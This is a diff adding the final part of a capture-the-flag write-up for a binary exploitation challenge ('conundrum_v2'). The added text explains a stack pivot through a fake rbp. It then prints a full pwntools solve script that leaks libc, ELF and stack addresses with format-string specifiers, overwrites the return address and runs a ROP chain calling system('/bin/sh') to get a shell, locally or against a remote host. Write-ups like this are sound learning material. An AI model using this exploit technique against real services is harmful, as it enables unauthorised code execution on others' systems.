@@ -163,7 +163,7 @@ I would leak that of libc, stack and the elf
 The important address i mentioned are at offset:
 - 24
 - 27
-- 29
+- 31
 
 Doing that we can have the important leaks and also jump back to the `question` function
 ![image](https://github.com/user-attachments/assets/15d3ab0f-84f7-40ce-a0ac-bac1428e9ed3)
@@ -220,13 +220,112 @@ pop rbp
 pop rip
 ```
 
-It would 
+It moves the current value in the `rbp` register to `rsp`, and after a pop instruction, it executes a `pop rip` 💀
+
+Remember, a `pop` instruction removes the value from the top of the stack and stores it in the specified register
+
+This means that after setting `rbp` to a fake address, the program will use the content of rbp to continue the execution flow
+
+Take note of the first `pop` instruction though as that occupies 8 bytes!
+
+Our goal now is easy!
+
+First we fill up the buffer with 8 bytes junk + our ropchain chain which effectively does a `system('/bin/sh')` + pad to 128 bytes + address of buffer
+
+Now when `question` returns then `main` will also try `ret` but then it would execute our ropchain
+
+Profit!
+
+Here's my final solve script
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('conundrum_v2_patched')
+libc = exe.libc
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+breakrva 0x8b5
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
 
 
+def solve():
+
+    leaks = f"%24$p.%27$p.%31$p.".encode()
+    partial_overwrite = leaks + b"A"*(128 - len(leaks)) + b"B"*8
+    io.sendlineafter(b"honestly):", b"2")
+    io.sendafter(b"pointers:", partial_overwrite + p8(0x43))
+    r = io.recv_raw(160)
+    leaks = r.split(b".")
+    libc.address = int(leaks[1], 16) - 0x21c87
+    exe.address = int(leaks[2], 16) - exe.sym["main"]
+    buf = int(leaks[0], 16) - 0x180
+
+    info("libc base: %#x", libc.address)
+    info("elf base: %#x", exe.address)
+    info("stack addr: %#x", buf)
+
+    pop_rdi = exe.address + 0x9d3 # pop rdi; ret;
+    sh = next(libc.search(b"/bin/sh\x00"))
+    system = libc.sym["system"]
+    ret = exe.address + 0x0696 # ret;
+
+    payload = flat(
+        [
+            pop_rdi,
+            sh,
+            ret,
+            system
+        ]
+    )
+
+    payload = b"A"*8 + payload
+    fake_rbp = payload.ljust(128, b".") + p64(buf)
+    io.sendafter(b"pointers:", fake_rbp)
+    io.clean()
+
+    io.interactive()
 
 
+def main():
+    
+    init()
+    solve()
+    
 
+if __name__ == '__main__':
+    main()
+```
 
+Running it works.
+![image](https://github.com/user-attachments/assets/30f5382f-e1c5-4205-8b33-bb15f7943f09)
+
+That's all, thanks for reading :)
 
 
 
